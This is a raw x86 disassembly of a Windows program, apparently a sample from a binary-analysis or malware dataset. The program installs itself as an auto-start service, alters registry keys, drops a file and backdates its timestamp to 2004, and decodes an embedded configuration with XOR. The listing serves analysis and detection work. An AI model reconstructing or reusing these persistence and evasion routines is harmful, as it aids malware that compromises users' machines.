sub_401080
sub esp 0x208
push esi
push rw-data
push 0x1
push 0x0
call [ CreateMutexA@IAT ]
mov esi eax
call [ GetLastError@IAT ]
cmp eax 0xb7
je r-xdata
xor eax eax
pop esi
add esp 0x208
retn 0x10
cmp eax 0x5
je r-xdata
push esi
call [ ReleaseMutex@IAT ]
push esi
call [ CloseHandle@IAT ]
call sub_401880
test eax eax
je r-xdata
push 0xa
call [ Sleep@IAT ]
push sub_401760
call [ SetUnhandledExceptionFilter@IAT ]
call sub_401160
push rw-data
mov esi eax
call [ DeleteFileA@IAT ]
test esi esi
je r-xdata
push esi
call sub_401780
add esp 0x4
lea eax [ esp + 0x4 ]
push 0x104
push eax
call [ GetWindowsDirectoryA@IAT ]
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0x108 ]
push ecx
push rw-data
push edx
call [ wsprintfA@IAT ]
add esp 0xc
lea eax [ esp + 0x108 ]
push eax
push esi
push rw-data
push rw-data
call [ WritePrivateProfileStringA@IAT ]
push esi
call sub_402730
add esp 0x4
sub_401160
push ebp
mov ebp esp
push 0xffffffff
push sub_402960
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xe58
push ebx
push esi
push edi
lea eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] esp
xor edi edi
push eax
mov [ ebp - 0x14 ] 0x80000002
mov ecx [ ebp - 0x14 ]
push 0x1
push edi
push rw-data
push ecx
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x4 ] edi
call [ RegOpenKeyExA@IAT ]
cmp eax edi
je r-xdata
lea eax [ ebp - 0x44 ]
lea ecx [ ebp - 0xc64 ]
push eax
mov eax [ ebp - 0x14 ]
lea edx [ ebp - 0x68 ]
push ecx
push edx
push edi
push rw-data
push eax
mov [ ebp - 0x44 ] 0x400
call [ RegQueryValueExA@IAT ]
mov ecx [ ebp - 0x14 ]
mov esi eax
push ecx
call [ RegCloseKey@IAT ]
push esi
call [ SetLastError@IAT ]
cmp esi edi
je r-xdata
lea edx [ ebp - 0x40 ]
push r--data
push edx
mov [ ebp - 0x40 ] rw-data
call _CxxThrowException
push 0xa
call [ Sleep@IAT ]
push 0xf003f
push edi
push edi
call [ OpenSCManagerA@IAT ]
cmp eax edi
mov [ ebp - 0x18 ] eax
jne r-xdata
lea edx [ ebp - 0x58 ]
push r--data
push edx
mov [ ebp - 0x58 ] rw-data
call _CxxThrowException
push rw-data
call [ LoadLibraryA@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
lea ecx [ ebp - 0x670 ]
push 0x104
push ecx
call eax
mov ebx rw-data
lea esi [ ebp - 0xc64 ]
lea eax [ ebp - 0x54 ]
push r--data
push eax
mov [ ebp - 0x54 ] rw-data
call _CxxThrowException
cmp [ ebp - 0x20 ] edi
jne r-xdata
push esi
lea edx [ ebp - 0x864 ]
push rw-data
push edx
call [ wsprintfA@IAT ]
add esp 0xc
lea eax [ ebp - 0x14 ]
lea ecx [ ebp - 0x864 ]
push eax
push 0x1
push edi
push ecx
push 0x80000002
call [ RegOpenKeyExA@IAT ]
cmp eax edi
jne r-xdata
push esi
call [ lstrlenA@IAT ]
inc eax
push eax
call ??2@YAPAXI@Z
add esp 0x4
mov edi eax
mov [ ebp - 0x1c ] edi
push esi
push edi
call [ lstrcpyA@IAT ]
mov esi [ ebp - 0x20 ]
test esi esi
jne r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx 0x41
xor eax eax
lea edi [ ebp - 0x16c ]
push esi
[ edi ]
lea eax [ ebp - 0x670 ]
lea ecx [ ebp - 0x16c ]
push eax
push rw-data
push ecx
call [ wsprintfA@IAT ]
add esp 0x10
push 0xa
call [ Sleep@IAT ]
lea edx [ ebp - 0x16c ]
push edx
call [ DeleteFileA@IAT ]
lea eax [ ebp - 0x16c ]
push eax
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
jne r-xdata
mov edx [ ebp - 0x14 ]
push edx
call [ RegCloseKey@IAT ]
jmp r-xdata
mov ebx [ Sleep@IAT ]
push 0xa
call ebx
push esi
mov esi [ CloseServiceHandle@IAT ]
call esi
mov eax [ ebp - 0x18 ]
push eax
call esi
push 0x400
lea ecx [ ebp - 0xc64 ]
push rw-data
push ecx
mov [ ebp - 0x14 ] 0x80000002
call [ strncpy@IAT ]
push 0x64
lea edx [ ebp - 0xc64 ]
push edi
push edx
call [ strncat@IAT ]
mov edx [ ebp - 0x14 ]
add esp 0x18
lea eax [ ebp - 0x14 ]
lea ecx [ ebp - 0xc64 ]
push eax
push 0xf003f
push 0x0
push ecx
push edx
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
lea edx [ ebp - 0x4c ]
push r--data
push edx
mov [ ebp - 0x4c ] rw-data
call _CxxThrowException
xor edi edi
push edi
push esi
call [ strchr@IAT ]
add esp 0x8
inc eax
mov esi eax
jmp r-xdata
push rw-data
call [ LoadLibraryA@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
push 0x0
push 0x0
push 0x0
mov ecx [ ebp - 0x18 ]
push 0x0
push 0x0
push ebx
push 0x1
push 0x2
push 0x20
push 0xf01ff
push esi
push esi
push ecx
call eax
test eax eax
mov [ ebp - 0x20 ] eax
jne r-xdata
push 0xa
mov [ ebp - 0x3c ] 0x120
call ebx
mov edx [ ebp - 0x14 ]
lea ecx [ ebp - 0x3c ]
push 0x4
push ecx
push 0x4
push 0x0
push rw-data
push edx
call [ RegSetValueExA@IAT ]
mov edi [ SetLastError@IAT ]
mov esi eax
push esi
call edi
test esi esi
je r-xdata
lea eax [ ebp - 0x5c ]
push r--data
push eax
mov [ ebp - 0x5c ] rw-data
call _CxxThrowException
cmp [ esi ] 0x0
je r-xdata
push 0xa
call ebx
mov edx [ ebp - 0x14 ]
lea ecx [ ebp - 0x28 ]
push ecx
push rw-data
push edx
call [ RegCreateKeyA@IAT ]
mov esi eax
push esi
call edi
test esi esi
je r-xdata
lea eax [ ebp - 0x48 ]
push r--data
push eax
mov [ ebp - 0x48 ] rw-data
call _CxxThrowException
push rw-data
push rw-data
call [ fopen@IAT ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov ebx eax
mov ax [ rw-data ]
mov [ ebp - 0x56c ] ecx
mov [ ebp - 0x564 ] ax
mov ecx 0xfd
xor eax eax
lea edi [ ebp - 0x562 ]
mov [ ebp - 0x568 ] edx
[ edi ]
stosw [ edi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
add esp 0x8
[ edi ]
not ecx
sub edi ecx
lea edx [ ebp - 0x56c ]
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ ebp - 0x16c ]
and ecx 0x3
push eax
[ edi ] [ esi ]
mov ecx [ ebp - 0x1c ]
lea edx [ ebp - 0xe64 ]
push ecx
push rw-data
push edx
call [ sprintf@IAT ]
lea edi [ ebp - 0xe64 ]
or ecx 0xffffffff
xor eax eax
lea edx [ ebp - 0x56c ]
[ edi ]
not ecx
sub edi ecx
push ebx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ ebp - 0x56c ]
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea edi [ ebp - 0x56c ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea eax [ ebp - 0x56c ]
push ecx
push 0x1
push eax
call [ fwrite@IAT ]
push ebx
call [ fclose@IAT ]
add esp 0x24
push 0xa
call [ Sleep@IAT ]
mov edi [ LoadLibraryA@IAT ]
push rw-data
call edi
mov ebx [ GetProcAddress@IAT ]
push rw-data
push eax
call ebx
push 0x0
push rw-data
call eax
jmp r-xdata
lea eax [ ebp - 0x50 ]
push r--data
push eax
mov [ ebp - 0x50 ] rw-data
call _CxxThrowException
mov ecx [ ebp - 0x14 ]
mov esi [ RegCloseKey@IAT ]
push ecx
mov [ ebp - 0x4 ] 0xffffffff
call esi
mov edx [ ebp - 0x28 ]
push edx
call esi
mov eax [ ebp - 0x20 ]
mov esi [ CloseServiceHandle@IAT ]
push eax
call esi
mov ecx [ ebp - 0x18 ]
push ecx
call esi
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x1c ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
lea edx [ ebp - 0x16c ]
push 0x40000000
push edx
call [ CreateFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
push rw-data
call edi
push rw-data
push eax
call ebx
push 0x7d0
call eax
xor eax eax
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x38 ]
mov [ ebp - 0x34 ] eax
push ecx
mov [ ebp - 0x30 ] eax
push edx
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x38 ] 0x7d4
mov [ ebp - 0x36 ] 0x8
mov [ ebp - 0x32 ] 0x11
mov [ ebp - 0x30 ] 0x14
mov [ ebp - 0x2e ] ax
call [ SystemTimeToFileTime@IAT ]
lea eax [ ebp - 0x64 ]
lea ecx [ ebp - 0x24 ]
push eax
push ecx
call [ LocalFileTimeToFileTime@IAT ]
lea edx [ ebp - 0x64 ]
lea eax [ ebp - 0x64 ]
push edx
push 0x0
push eax
push esi
call [ SetFileTime@IAT ]
push rw-data
mov [ ebp - 0x18 ] 0x0
call edi
push rw-data
push eax
call ebx
lea ecx [ ebp - 0x18 ]
push 0x0
push ecx
push 0x1fa00
push rw-data
push esi
call eax
push 0xa
call [ Sleep@IAT ]
push esi
call [ CloseHandle@IAT ]
sub_401780
sub esp 0x14
push esi
push 0x2
push 0x0
push 0x0
call [ OpenSCManagerA@IAT ]
mov esi eax
test esi esi
mov [ esp + 0x4 ] esi
je r-xdata
pop esi
add esp 0x14
retn
mov eax [ esp + 0x1c ]
push ebx
push ebp
push 0x10010
push eax
push esi
call [ OpenServiceA@IAT ]
mov ebp [ CloseServiceHandle@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
push esi
call ebp
pop ebp
pop ebx
xor ecx ecx
push edi
mov [ esp + 0x14 ] ecx
lea edx [ esp + 0x14 ]
mov [ esp + 0x18 ] ecx
push rw-data
mov [ esp + 0x20 ] ecx
push edx
mov [ esp + 0x28 ] ecx
call [ sprintf@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
add esp 0x8
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x14 ]
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push rw-data
and ecx 0x3
[ edi ] [ esi ]
call [ LoadLibraryA@IAT ]
lea ecx [ esp + 0x14 ]
push ecx
push eax
call [ GetProcAddress@IAT ]
push 0x0
push 0x0
push ebx
call eax
push ebx
call ebp
mov esi [ esp + 0x10 ]
pop edi
sub_401850
push esi
mov esi [ esp + 0xc ]
xor ecx ecx
test esi esi
jle r-xdata
pop esi
retn
mov edx [ esp + 0x8 ]
inc ecx
cmp ecx esi
jl r-xdata
xor al 0x3e
mov [ ecx + edx ] al
mov al [ ecx + edx ]
test al al
je r-xdata
sub_401880
push 0xffffffff
push sub_4029ac
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x5e0
mov al [ esp + 0x3 ]
push ebx
push ebp
push esi
xor ebx ebx
push edi
push ebx
lea ecx [ esp + 0x7c ]
mov [ esp + 0x7c ] al
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push 0x1
[ edi ]
not ecx
dec ecx
mov ebp ecx
lea ecx [ esp + 0x7c ]
push ebp
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Grow@IAT ]
test al al
je r-xdata
mov al [ esp + 0x13 ]
push ebx
lea ecx [ esp + 0x28 ]
mov [ esp + 0x5fc ] ebx
mov [ esp + 0x28 ] al
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push 0x1
[ edi ]
not ecx
dec ecx
mov ebp ecx
lea ecx [ esp + 0x28 ]
push ebp
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Grow@IAT ]
test al al
je r-xdata
mov edi [ esp + 0x7c ]
mov ecx ebp
mov edx ecx
mov esi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push ebp
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x7c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Eos@IAT ]
mov al [ esp + 0x13 ]
push ebx
lea ecx [ esp + 0x18 ]
mov [ esp + 0x5fc ] 0x1
mov [ esp + 0x18 ] al
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push 0x1
[ edi ]
not ecx
dec ecx
mov ebp ecx
lea ecx [ esp + 0x18 ]
push ebp
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Grow@IAT ]
test al al
je r-xdata
mov edi [ esp + 0x28 ]
mov ecx ebp
mov edx ecx
mov esi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push ebp
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Eos@IAT ]
lea eax [ esp + 0x3e8 ]
push 0x104
push eax
mov [ esp + 0x600 ] 0x2
mov [ esp + 0x98 ] ebx
mov [ esp + 0x90 ] ebx
mov [ esp + 0x94 ] ebx
mov [ esp + 0x9c ] ebx
mov [ esp + 0xa4 ] ebx
call [ GetWindowsDirectoryA@IAT ]
lea ecx [ esp + 0x3e8 ]
lea edx [ esp + 0xe0 ]
push ecx
push rw-data
push edx
call [ sprintf@IAT ]
add esp 0xc
lea eax [ esp + 0xe0 ]
push ebx
push 0x80
push 0x2
push ebx
push 0x3
push 0xc0000000
push eax
call [ CreateFileA@IAT ]
or esi 0xffffffff
cmp eax esi
jne r-xdata
mov edi [ esp + 0x18 ]
mov ecx ebp
mov edx ecx
mov esi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push ebp
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Eos@IAT ]
push eax
call [ CloseHandle@IAT ]
lea ecx [ esp + 0x4ec ]
push 0x104
push ecx
push ebx
call [ GetModuleFileNameA@IAT ]
lea edx [ esp + 0x4ec ]
push rw-data
push edx
call [ fopen@IAT ]
mov ebp eax
add esp 0x8
cmp ebp ebx
jne r-xdata
push 0x1
lea ecx [ esp + 0x18 ]
mov [ esp + 0x5fc ] 0x1
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
push 0x1
lea ecx [ esp + 0x28 ]
mov [ esp + 0x5fc ] 0x0
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
mov [ esp + 0x5f8 ] esi
jmp r-xdata
mov ebx [ fseek@IAT ]
xor eax eax
mov ecx 0x20
lea edi [ esp + 0x264 ]
push eax
push 0x2b0
[ edi ]
push ebp
call ebx
mov esi [ fread@IAT ]
push ebp
push 0x80
lea eax [ esp + 0x278 ]
push 0x1
push eax
call esi
lea ecx [ esp + 0x280 ]
push 0x80
push ecx
call sub_401850
lea edi [ esp + 0x288 ]
or ecx 0xffffffff
xor eax eax
add esp 0x24
[ edi ]
not ecx
dec ecx
je r-xdata
push 0x1
lea ecx [ esp + 0x18 ]
mov [ esp + 0x5fc ] 0x1
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
push 0x1
lea ecx [ esp + 0x28 ]
mov [ esp + 0x5fc ] 0x0
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
mov [ esp + 0x5f8 ] esi
jmp r-xdata
push 0x1
lea ecx [ esp + 0x7c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
push 0x1
lea ecx [ esp + 0x18 ]
mov [ esp + 0x5fc ] 0x1
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
push 0x1
lea ecx [ esp + 0x28 ]
mov [ esp + 0x5fc ] 0x0
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
mov [ esp + 0x5f8 ] 0xffffffff
mov ecx 0x41
lea edi [ esp + 0x2e4 ]
lea edx [ esp + 0x264 ]
[ edi ]
push edx
lea eax [ esp + 0x2e8 ]
push rw-data
push eax
call [ sprintf@IAT ]
xor eax eax
mov ecx 0x20
lea edi [ esp + 0x1f0 ]
push eax
push 0x330
push ebp
[ edi ]
call ebx
push ebp
push 0x80
lea ecx [ esp + 0x204 ]
push 0x1
push ecx
call esi
lea edx [ esp + 0x20c ]
push 0x80
push edx
call sub_401850
lea edi [ esp + 0x214 ]
or ecx 0xffffffff
xor eax eax
add esp 0x30
[ edi ]
not ecx
dec ecx
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push 0x1
[ edi ]
not ecx
dec ecx
mov [ esp + 0x60 ] ecx
push ecx
lea ecx [ esp + 0x1c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Grow@IAT ]
test al al
je r-xdata
lea edi [ esp + 0x1e4 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
push 0x1
mov [ esp + 0x60 ] ecx
push ecx
lea ecx [ esp + 0x1c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Grow@IAT ]
test al al
je r-xdata
xor edi edi
push edi
push 0x3b0
push ebp
call ebx
push ebp
push 0x4
lea edx [ esp + 0x9c ]
push 0x1
push edx
call esi
push edi
push 0x3b4
push ebp
call ebx
push ebp
push 0x4
lea eax [ esp + 0xbc ]
push 0x1
push eax
call esi
push edi
push 0x3b8
push ebp
call ebx
add esp 0x44
lea ecx [ esp + 0x94 ]
push ebp
push 0x4
push 0x1
push ecx
call esi
push edi
push 0x3bc
push ebp
call ebx
push ebp
push 0x4
lea edx [ esp + 0xc0 ]
push 0x1
push edx
call esi
push edi
push 0x3c0
push ebp
call ebx
push ebp
push 0x1
lea eax [ esp + 0xd0 ]
push 0x1
push eax
call esi
add esp 0x48
mov [ esp + 0x64 ] edi
mov [ esp + 0x98 ] edi
mov [ esp + 0x60 ] edi
push edi
push 0x3c1
push ebp
mov [ esp + 0x5c ] edi
call ebx
push ebp
push 0x1
lea ecx [ esp + 0x78 ]
push 0x1
push ecx
call esi
mov eax [ esp + 0x80 ]
add esp 0x1c
cmp eax edi
je r-xdata
mov eax [ esp + 0x5c ]
mov esi rw-data
mov ecx eax
mov eax [ esp + 0x5c ]
lea esi [ esp + 0x1e4 ]
mov ecx eax
jmp r-xdata
mov edi [ sprintf@IAT ]
xor edx edx
mov [ esp + 0x38 ] edx
mov [ esp + 0x3c ] edx
mov [ esp + 0x40 ] edx
push edx
push 0x3c2
push ebp
mov [ esp + 0x50 ] edx
call ebx
push ebp
push 0x10
lea eax [ esp + 0x4c ]
push 0x1
push eax
call esi
lea ecx [ esp + 0x54 ]
push 0x10
push ecx
call sub_401850
lea edi [ esp + 0x5c ]
or ecx 0xffffffff
xor eax eax
add esp 0x24
[ edi ]
not ecx
dec ecx
je r-xdata
mov edi [ esp + 0x18 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x18 ]
mov esi [ fread@IAT ]
mov [ esp + 0x1c ] eax
mov [ ecx + eax ] 0x0
mov eax [ esp + 0x28 ]
xor ebx ebx
cmp eax ebx
jne r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
test al al
je r-xdata
mov ecx [ esp + 0x18 ]
xor esi esi
cmp ecx esi
je r-xdata
mov edi [ sprintf@IAT ]
xor edx edx
mov [ esp + 0xc0 ] edx
lea eax [ esp + 0x38 ]
mov [ esp + 0xc4 ] edx
push eax
lea ecx [ esp + 0xc4 ]
mov [ esp + 0xcc ] edx
push rw-data
push ecx
mov [ esp + 0xd8 ] edx
call edi
push 0x0
push 0x3d2
push ebp
call ebx
push ebp
push 0x2
lea edx [ esp + 0x80 ]
push 0x1
push edx
call esi
mov eax [ esp + 0x88 ]
add esp 0x28
test eax eax
jg r-xdata
lea edx [ esp + 0xe0 ]
push edx
push eax
push rw-data
push rw-data
call esi
lea eax [ esp + 0xd0 ]
push eax
call sub_402490
add esp 0x4
mov ecx [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
mov [ esp + 0x5f8 ] 0x4
mov edx [ ecx ]
lea ecx [ esp + 0x78 ]
push edx
push ebx
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
mov eax [ esp + 0xd4 ]
cmp eax ebx
je r-xdata
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Nullstr::_C::~_C@IAT ]
push ecx
call sub_402730
add esp 0x4
cmp al 0xff
je r-xdata
mov ecx [ esp + 0x28 ]
mov [ esp + 0x18 ] esi
cmp ecx esi
mov [ esp + 0x1c ] esi
mov [ esp + 0x20 ] esi
je r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
xor eax eax
mov [ esp + 0x38 ] eax
mov [ esp + 0x3c ] eax
mov [ esp + 0x40 ] eax
push eax
push 0x3d4
push ebp
mov [ esp + 0x50 ] eax
call ebx
push ebp
push 0x10
lea ecx [ esp + 0x4c ]
push 0x1
push ecx
call esi
lea edx [ esp + 0x54 ]
push 0x10
push edx
call sub_401850
xor eax eax
add esp 0x24
mov [ esp + 0xb0 ] eax
lea ecx [ esp + 0x38 ]
mov [ esp + 0xb4 ] eax
push ecx
lea edx [ esp + 0xb4 ]
mov [ esp + 0xbc ] eax
push rw-data
push edx
mov [ esp + 0xc8 ] eax
call edi
xor eax eax
mov [ esp + 0x44 ] eax
mov [ esp + 0x48 ] eax
mov [ esp + 0x4c ] eax
push eax
push 0x3e4
push ebp
mov [ esp + 0x5c ] eax
call ebx
push ebp
push 0x10
lea ecx [ esp + 0x58 ]
push 0x1
push ecx
call esi
lea edx [ esp + 0x60 ]
push 0x10
push edx
call sub_401850
xor eax eax
add esp 0x30
mov [ esp + 0xa0 ] eax
lea ecx [ esp + 0x38 ]
mov [ esp + 0xa4 ] eax
push ecx
lea edx [ esp + 0xa4 ]
mov [ esp + 0xac ] eax
push rw-data
push edx
mov [ esp + 0xb8 ] eax
call edi
push 0x0
push 0x3f4
push ebp
call ebx
push ebp
push 0x2
lea eax [ esp + 0x70 ]
push 0x1
push eax
call esi
mov eax [ esp + 0x78 ]
add esp 0x28
test eax eax
jge r-xdata
mov ecx [ esp + 0x18 ]
xor esi esi
cmp ecx esi
je r-xdata
mov eax [ esp + 0x7c ]
cmp eax ebx
jne r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
test al al
je r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
mov ecx [ esp + 0x7c ]
mov [ esp + 0x28 ] esi
cmp ecx esi
mov [ esp + 0x2c ] esi
mov [ esp + 0x30 ] esi
je r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
dec ecx
push ecx
call sub_402730
add esp 0x4
cmp al 0xff
je r-xdata
push 0x0
push 0x3f6
push ebp
call ebx
push ebp
push 0x1
lea ecx [ esp + 0xac ]
push 0x1
push ecx
call esi
push ebp
call [ fclose@IAT ]
mov esi [ WritePrivateProfileStringA@IAT ]
add esp 0x20
lea edx [ esp + 0xe0 ]
lea eax [ esp + 0x2e4 ]
push edx
push eax
push rw-data
push rw-data
call esi
lea ecx [ esp + 0xd0 ]
push ecx
call sub_4025e0
add esp 0x4
mov edx [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
mov [ esp + 0x5f8 ] 0x3
mov ecx [ edx ]
push ecx
push 0x0
push eax
lea ecx [ esp + 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
mov eax [ esp + 0xd4 ]
mov [ esp + 0x5f8 ] 0x2
test eax eax
je r-xdata
mov ecx [ esp + 0x28 ]
mov [ esp + 0x18 ] esi
cmp ecx esi
mov [ esp + 0x1c ] esi
mov [ esp + 0x20 ] esi
je r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
lea ecx [ esp + 0xe0 ]
push ecx
push eax
push rw-data
push rw-data
call esi
mov eax [ esp + 0x88 ]
xor edx edx
mov [ esp + 0x68 ] edx
cmp eax ebx
mov [ esp + 0x6c ] dl
jg r-xdata
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Nullstr::_C::~_C@IAT ]
push ecx
call sub_402730
add esp 0x4
cmp al 0xff
je r-xdata
xor eax eax
mov al [ ecx - 0x1 ]
test al al
je r-xdata
dec ecx
push ecx
call sub_402730
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
mov ecx [ esp + 0x7c ]
mov [ esp + 0x28 ] esi
cmp ecx esi
mov [ esp + 0x2c ] esi
mov [ esp + 0x30 ] esi
je r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
dec ecx
push ecx
call sub_402730
add esp 0x4
cmp al 0xff
je r-xdata
push eax
lea ecx [ esp + 0x6c ]
push rw-data
push ecx
call edi
add esp 0xc
lea eax [ esp + 0x68 ]
push rw-data
push eax
call edi
add esp 0x8
jmp r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
dec ecx
push ecx
call sub_402730
add esp 0x4
jmp r-xdata
cmp al 0xff
je r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
dec ecx
push ecx
call sub_402730
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
push eax
lea eax [ esp + 0x58 ]
push rw-data
push eax
call edi
add esp 0xc
lea edx [ esp + 0x54 ]
push rw-data
push edx
call edi
add esp 0x8
jmp r-xdata
lea edx [ esp + 0xe0 ]
lea eax [ esp + 0x68 ]
push edx
push eax
push rw-data
push rw-data
call esi
mov eax [ esp + 0x8c ]
xor ecx ecx
mov [ esp + 0x54 ] ecx
cmp eax ebx
mov [ esp + 0x58 ] cl
jg r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
cmp al 0xff
je r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
push eax
lea edx [ esp + 0x4c ]
push rw-data
push edx
call edi
add esp 0xc
lea ecx [ esp + 0x48 ]
push rw-data
push ecx
call edi
add esp 0x8
jmp r-xdata
lea ecx [ esp + 0xe0 ]
lea edx [ esp + 0x54 ]
push ecx
push edx
push rw-data
push rw-data
call esi
xor eax eax
mov [ esp + 0x48 ] eax
mov [ esp + 0x4c ] al
mov eax [ esp + 0x94 ]
cmp eax ebx
jg r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
push eax
lea ecx [ esp + 0x74 ]
push rw-data
push ecx
call edi
add esp 0xc
lea eax [ esp + 0x70 ]
push rw-data
push eax
call edi
add esp 0x8
jmp r-xdata
lea eax [ esp + 0xe0 ]
lea ecx [ esp + 0x48 ]
push eax
push ecx
push rw-data
push rw-data
call esi
mov eax [ esp + 0x9c ]
xor edx edx
mov [ esp + 0x70 ] edx
cmp eax ebx
mov [ esp + 0x74 ] dl
jg r-xdata
lea ecx [ esp + 0xe0 ]
push ecx
push eax
push rw-data
push rw-data
call esi
cmp [ esp + 0x90 ] ebx
je r-xdata
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Nullstr::_C::~_C@IAT ]
lea edx [ esp + 0xe0 ]
lea eax [ esp + 0x70 ]
push edx
push eax
push rw-data
push rw-data
call esi
mov eax [ esp + 0x18 ]
cmp eax ebx
jne r-xdata
lea eax [ esp + 0xe0 ]
push eax
push rw-data
lea edx [ esp + 0xe0 ]
push edx
push rw-data
jmp r-xdata
push rw-data
push rw-data
push rw-data
push rw-data
push rw-data
call esi
lea edx [ esp + 0xe0 ]
lea eax [ esp + 0xc0 ]
push edx
push eax
push rw-data
push rw-data
call esi
mov ecx [ esp + 0x60 ]
lea edx [ esp + 0x34 ]
push ecx
push rw-data
push edx
mov [ esp + 0x40 ] ebx
call edi
add esp 0xc
lea eax [ esp + 0xe0 ]
lea ecx [ esp + 0x34 ]
push eax
push ecx
push rw-data
push rw-data
call esi
lea edx [ esp + 0xe0 ]
lea eax [ esp + 0xb0 ]
push edx
